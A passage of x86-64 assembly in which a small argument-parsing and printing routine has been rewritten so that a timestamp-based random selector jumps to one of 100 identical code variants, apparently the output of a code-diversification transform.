	cmpl	$20, %eax
	je	.Lmain_win3_var20
	cmpl	$21, %eax
	je	.Lmain_win3_var21
	cmpl	$22, %eax
	je	.Lmain_win3_var22
	cmpl	$23, %eax
	je	.Lmain_win3_var23
	cmpl	$24, %eax
	je	.Lmain_win3_var24
	cmpl	$25, %eax
	je	.Lmain_win3_var25
	cmpl	$26, %eax
	je	.Lmain_win3_var26
	cmpl	$27, %eax
	je	.Lmain_win3_var27
	cmpl	$28, %eax
	je	.Lmain_win3_var28
	cmpl	$29, %eax
	je	.Lmain_win3_var29
	cmpl	$30, %eax
	je	.Lmain_win3_var30
	cmpl	$31, %eax
	je	.Lmain_win3_var31
	cmpl	$32, %eax
	je	.Lmain_win3_var32
	cmpl	$33, %eax
	je	.Lmain_win3_var33
	cmpl	$34, %eax
	je	.Lmain_win3_var34
	cmpl	$35, %eax
	je	.Lmain_win3_var35
	cmpl	$36, %eax
	je	.Lmain_win3_var36
	cmpl	$37, %eax
	je	.Lmain_win3_var37
	cmpl	$38, %eax
	je	.Lmain_win3_var38
	cmpl	$39, %eax
	je	.Lmain_win3_var39
	cmpl	$40, %eax
	je	.Lmain_win3_var40
	cmpl	$41, %eax
	je	.Lmain_win3_var41
	cmpl	$42, %eax
	je	.Lmain_win3_var42
	cmpl	$43, %eax
	je	.Lmain_win3_var43
	cmpl	$44, %eax
	je	.Lmain_win3_var44
	cmpl	$45, %eax
	je	.Lmain_win3_var45
	cmpl	$46, %eax
	je	.Lmain_win3_var46
	cmpl	$47, %eax
	je	.Lmain_win3_var47
	cmpl	$48, %eax
	je	.Lmain_win3_var48
	cmpl	$49, %eax
	je	.Lmain_win3_var49
	cmpl	$50, %eax
	je	.Lmain_win3_var50
	cmpl	$51, %eax
	je	.Lmain_win3_var51
	cmpl	$52, %eax
	je	.Lmain_win3_var52
	cmpl	$53, %eax
	je	.Lmain_win3_var53
	cmpl	$54, %eax
	je	.Lmain_win3_var54
	cmpl	$55, %eax
	je	.Lmain_win3_var55
	cmpl	$56, %eax
	je	.Lmain_win3_var56
	cmpl	$57, %eax
	je	.Lmain_win3_var57
	cmpl	$58, %eax
	je	.Lmain_win3_var58
	cmpl	$59, %eax
	je	.Lmain_win3_var59
	cmpl	$60, %eax
	je	.Lmain_win3_var60
	cmpl	$61, %eax
	je	.Lmain_win3_var61
	cmpl	$62, %eax
	je	.Lmain_win3_var62
	cmpl	$63, %eax
	je	.Lmain_win3_var63
	cmpl	$64, %eax
	je	.Lmain_win3_var64
	cmpl	$65, %eax
	je	.Lmain_win3_var65
	cmpl	$66, %eax
	je	.Lmain_win3_var66
	cmpl	$67, %eax
	je	.Lmain_win3_var67
	cmpl	$68, %eax
	je	.Lmain_win3_var68
	cmpl	$69, %eax
	je	.Lmain_win3_var69
	cmpl	$70, %eax
	je	.Lmain_win3_var70
	cmpl	$71, %eax
	je	.Lmain_win3_var71
	cmpl	$72, %eax
	je	.Lmain_win3_var72
	cmpl	$73, %eax
	je	.Lmain_win3_var73
	cmpl	$74, %eax
	je	.Lmain_win3_var74
	cmpl	$75, %eax
	je	.Lmain_win3_var75
	cmpl	$76, %eax
	je	.Lmain_win3_var76
	cmpl	$77, %eax
	je	.Lmain_win3_var77
	cmpl	$78, %eax
	je	.Lmain_win3_var78
	cmpl	$79, %eax
	je	.Lmain_win3_var79
	cmpl	$80, %eax
	je	.Lmain_win3_var80
	cmpl	$81, %eax
	je	.Lmain_win3_var81
	cmpl	$82, %eax
	je	.Lmain_win3_var82
	cmpl	$83, %eax
	je	.Lmain_win3_var83
	cmpl	$84, %eax
	je	.Lmain_win3_var84
	cmpl	$85, %eax
	je	.Lmain_win3_var85
	cmpl	$86, %eax
	je	.Lmain_win3_var86
	cmpl	$87, %eax
	je	.Lmain_win3_var87
	cmpl	$88, %eax
	je	.Lmain_win3_var88
	cmpl	$89, %eax
	je	.Lmain_win3_var89
	cmpl	$90, %eax
	je	.Lmain_win3_var90
	cmpl	$91, %eax
	je	.Lmain_win3_var91
	cmpl	$92, %eax
	je	.Lmain_win3_var92
	cmpl	$93, %eax
	je	.Lmain_win3_var93
	cmpl	$94, %eax
	je	.Lmain_win3_var94
	cmpl	$95, %eax
	je	.Lmain_win3_var95
	cmpl	$96, %eax
	je	.Lmain_win3_var96
	cmpl	$97, %eax
	je	.Lmain_win3_var97
	cmpl	$98, %eax
	je	.Lmain_win3_var98
	cmpl	$99, %eax
	je	.Lmain_win3_var99
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 3
.Lmain_win3_var3:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 4
.Lmain_win3_var4:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 5
.Lmain_win3_var5:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 6
.Lmain_win3_var6:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 7
.Lmain_win3_var7:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 8
.Lmain_win3_var8:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 9
.Lmain_win3_var9:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 10
.Lmain_win3_var10:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 11
.Lmain_win3_var11:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 12
.Lmain_win3_var12:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 13
.Lmain_win3_var13:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 14
.Lmain_win3_var14:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 15
.Lmain_win3_var15:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 16
.Lmain_win3_var16:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 17
.Lmain_win3_var17:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 18
.Lmain_win3_var18:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 19
.Lmain_win3_var19:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 20
.Lmain_win3_var20:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 21
.Lmain_win3_var21:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 22
.Lmain_win3_var22:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 23
.Lmain_win3_var23:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 24
.Lmain_win3_var24:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 25
.Lmain_win3_var25:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 26
.Lmain_win3_var26:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 27
.Lmain_win3_var27:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 28
.Lmain_win3_var28:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 29
.Lmain_win3_var29:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 30
.Lmain_win3_var30:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 31
.Lmain_win3_var31:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 32
.Lmain_win3_var32:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 33
.Lmain_win3_var33:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 34
.Lmain_win3_var34:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 35
.Lmain_win3_var35:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 36
.Lmain_win3_var36:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 37
.Lmain_win3_var37:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 38
.Lmain_win3_var38:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 39
.Lmain_win3_var39:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 40
.Lmain_win3_var40:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 41
.Lmain_win3_var41:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 42
.Lmain_win3_var42:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 43
.Lmain_win3_var43:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 44
.Lmain_win3_var44:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 45
.Lmain_win3_var45:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 46
.Lmain_win3_var46:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 47
.Lmain_win3_var47:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 48
.Lmain_win3_var48:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 49
.Lmain_win3_var49:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 50
.Lmain_win3_var50:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 51
.Lmain_win3_var51:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 52
.Lmain_win3_var52:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 53
.Lmain_win3_var53:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 54
.Lmain_win3_var54:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 55
.Lmain_win3_var55:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 56
.Lmain_win3_var56:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 57
.Lmain_win3_var57:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 58
.Lmain_win3_var58:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 59
.Lmain_win3_var59:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 60
.Lmain_win3_var60:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 61
.Lmain_win3_var61:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 62
.Lmain_win3_var62:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 63
.Lmain_win3_var63:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 64
.Lmain_win3_var64:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 65
.Lmain_win3_var65:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 66
.Lmain_win3_var66:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 67
.Lmain_win3_var67:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 68
.Lmain_win3_var68:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 69
.Lmain_win3_var69:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 70
.Lmain_win3_var70:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 71
.Lmain_win3_var71:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 72
.Lmain_win3_var72:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 73
.Lmain_win3_var73:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 74
.Lmain_win3_var74:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 75
.Lmain_win3_var75:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 76
.Lmain_win3_var76:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 77
.Lmain_win3_var77:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 78
.Lmain_win3_var78:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 79
.Lmain_win3_var79:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 80
.Lmain_win3_var80:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 81
.Lmain_win3_var81:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 82
.Lmain_win3_var82:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 83
.Lmain_win3_var83:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 84
.Lmain_win3_var84:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 85
.Lmain_win3_var85:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 86
.Lmain_win3_var86:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 87
.Lmain_win3_var87:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 88
.Lmain_win3_var88:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 89
.Lmain_win3_var89:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 90
.Lmain_win3_var90:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 91
.Lmain_win3_var91:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 92
.Lmain_win3_var92:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 93
.Lmain_win3_var93:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 94
.Lmain_win3_var94:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 95
.Lmain_win3_var95:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 96
.Lmain_win3_var96:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 97
.Lmain_win3_var97:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 98
.Lmain_win3_var98:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
## Variant 99
.Lmain_win3_var99:
	popq	%rax
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	cmpl	$3, %eax
	je	.Lmain_win2_var3
	cmpl	$4, %eax
	je	.Lmain_win2_var4
	cmpl	$5, %eax
	je	.Lmain_win2_var5
	cmpl	$6, %eax
	je	.Lmain_win2_var6
	cmpl	$7, %eax
	je	.Lmain_win2_var7
	cmpl	$8, %eax
	je	.Lmain_win2_var8
	cmpl	$9, %eax
	je	.Lmain_win2_var9
	cmpl	$10, %eax
	je	.Lmain_win2_var10
	cmpl	$11, %eax
	je	.Lmain_win2_var11
	cmpl	$12, %eax
	je	.Lmain_win2_var12
	cmpl	$13, %eax
	je	.Lmain_win2_var13
	cmpl	$14, %eax
	je	.Lmain_win2_var14
	cmpl	$15, %eax
	je	.Lmain_win2_var15
	cmpl	$16, %eax
	je	.Lmain_win2_var16
	cmpl	$17, %eax
	je	.Lmain_win2_var17
	cmpl	$18, %eax
	je	.Lmain_win2_var18
	cmpl	$19, %eax
	je	.Lmain_win2_var19
	cmpl	$20, %eax
	je	.Lmain_win2_var20
	cmpl	$21, %eax
	je	.Lmain_win2_var21
	cmpl	$22, %eax
	je	.Lmain_win2_var22
	cmpl	$23, %eax
	je	.Lmain_win2_var23
	cmpl	$24, %eax
	je	.Lmain_win2_var24
	cmpl	$25, %eax
	je	.Lmain_win2_var25
	cmpl	$26, %eax
	je	.Lmain_win2_var26
	cmpl	$27, %eax
	je	.Lmain_win2_var27
	cmpl	$28, %eax
	je	.Lmain_win2_var28
	cmpl	$29, %eax
	je	.Lmain_win2_var29
	cmpl	$30, %eax
	je	.Lmain_win2_var30
	cmpl	$31, %eax
	je	.Lmain_win2_var31
	cmpl	$32, %eax
	je	.Lmain_win2_var32
	cmpl	$33, %eax
	je	.Lmain_win2_var33
	cmpl	$34, %eax
	je	.Lmain_win2_var34
	cmpl	$35, %eax
